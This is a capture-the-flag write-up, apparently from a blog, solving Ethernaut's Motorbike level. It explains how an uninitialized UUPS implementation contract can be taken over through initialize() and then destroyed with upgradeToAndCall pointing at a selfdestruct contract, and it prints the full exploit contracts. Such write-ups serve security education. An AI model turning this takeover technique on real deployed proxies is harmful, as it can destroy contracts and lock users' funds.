![](https://ethernaut.openzeppelin.com/imgs/BigLevel25.svg)

Ethernaut's motorbike has a brand new upgradeable engine design.

Would you be able to `selfdestruct` its engine and make the motorbike unusable ?

Things that might help:

- [EIP-1967](https://eips.ethereum.org/EIPS/eip-1967)
- [UUPS](https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786) upgradeable pattern
- [Initializable](https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/master/packages/core/contracts/Initializable.sol) contract

```sol
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "openzeppelin-contracts-06/utils/Address.sol";
import "openzeppelin-contracts-06/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    struct AddressSlot {
        address value;
    }
    
    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(
            abi.encodeWithSignature("initialize()")
        );
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`. 
    // Will run if no other function in the contract matches the call data
    fallback () external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }
    
    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
        
        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```

Solution:
## Analysis

This level is using a proxy pattern called [UUPS](https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786) (Universal Upgradeable Proxy Standard). The last one which we saw in [Level 24](https://blog.dixitaditya.com/ethernaut-level-24-puzzle-wallet) was a Transparent proxy pattern.

The difference is that in a UUPS proxy pattern, the contract upgrade logic will also be coded in the implementation contract and not the proxy contract. This allows the user to save some gas. This is how the structure looks:

![image.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1662815219918/duvwx0juR.png?auto=compress,format&format=webp)

The other difference is that there's a storage slot defined in the proxy contract that stores the address of the logic contract. This is updated every time the logic contract is upgraded. This is to prevent storage collision. More on this can be read on [EIP-1967](https://eips.ethereum.org/EIPS/eip-1967).

In our case, the proxy contract is the Motorbike and the implementation/logic contract is Engine. When we take a look at the proxy contract, we can see the storage slot defined as:

```sol
bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
```

This slot is storing the address of the implementation contract.

When we look at the Engine contract, we can see that there's no `selfdestruct()` defined in the contract code. So how will we make a call to it? We will try to upgrade the implementation contract to point it to our deployed attacker contract.

To upgrade the logic, the Engine contract defines a function called `upgradeToAndCall()`:

```sol
function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
    _authorizeUpgrade();
    _upgradeToAndCall(newImplementation, data);
}
function _authorizeUpgrade() internal view {
    require(msg.sender == upgrader, "Can't upgrade");
}
```

This is calling `_authorizeUpgrade()` to check if the `msg.sender` is `upgrader`. Therefore, to upgrade the contract we need to make sure we are `upgrader`. So how do we become an upgrader? Let's take a look at the `initialize()` function:

```sol
function initialize() external initializer {
    horsePower = 1000;
    upgrader = msg.sender;
}
```

`initialize()` is a special function used in UUPS-based contracts. And, along with `initializer` modifier, this acts as a constructor which can only be called once. (This is checked in the `initializer` modifier).

Something which should be observed here is that in this implementation, the `initialize()` function is supposed to be called by the proxy contract which it is doing. You can see in its constructor. But remember that it is doing so using a `delegatecall()`. And when a caller contract makes a delegate call to another contract, the caller contract's storage slots are updated using the code of the logic contract.

This means that the `delegatecall()` is being made in the context of the proxy contract and not the implementation.

So it is absolutely true that the proxy contract can only call the `initialize()` once and it'll update its storage values but what if we are to find the deployed address of the implementation contract and call the `initialize()` manually? In the context of the implementation contract, this has not yet been called. So if we are to call the function, our user (`msg.sender`) will become the upgrader.

Once we become the `upgrader` we can just call the `upgradeToAndCall()` with our own contract's address in which we can create a `selfdestruct()` function. This should be enough to solve the level.

---
## The Exploit

Lets first create our [attacker contract](https://github.com/az0mb13/ethernaut-foundry/blob/master/src/level25.sol) which will house the `selfdestruct()` function:

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Destructive {
    function killed() external {
        selfdestruct(address(0));
    }    
}
```

Just a simple contract with `selfdestruct()` being called in the `killed()` external function.

This is how our exploit script looks:

```sol
contract PWN{
    IEngine engineAddress = IEngine(address(0x7B12f9aA28CfD4542e981BE24D37E3d3679D909d));
    function run() external{
        engineAddress.initialize();
        bytes memory encodedData = abi.encodeWithSignature("killed()");
        engineAddress.upgradeToAndCall(0xde784f7d09Bf418d4E1310671497104720a63906, encodedData);
    }
}

```

- `Engine engineAddress` - This contains the address of the Engine, calculated using `vm.load(contract_address, slot_no)`. Since this will return a `bytes32` value and the address is 20 bytes, we need to convert it to store it into an address-type variable. That's why the extra `address(uint160(uint256()))` are being used. This can also be obtained from the console using
```js
await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
```  
- `engineAddress.initialize()` - We are calling the `initialize()` function to become the upgrader.
- `bytes memory encodedData` - This is the data that will be sent inside the `upgradeToAndCall()` method.
- `engineAddress.upgradeToAndCall` - Finally, we are making the call to upgrade the implementation contract. This function expects the implementation's address as the first parameter and the encoded data which contains the function signature to call while upgrading the contract as the second one.
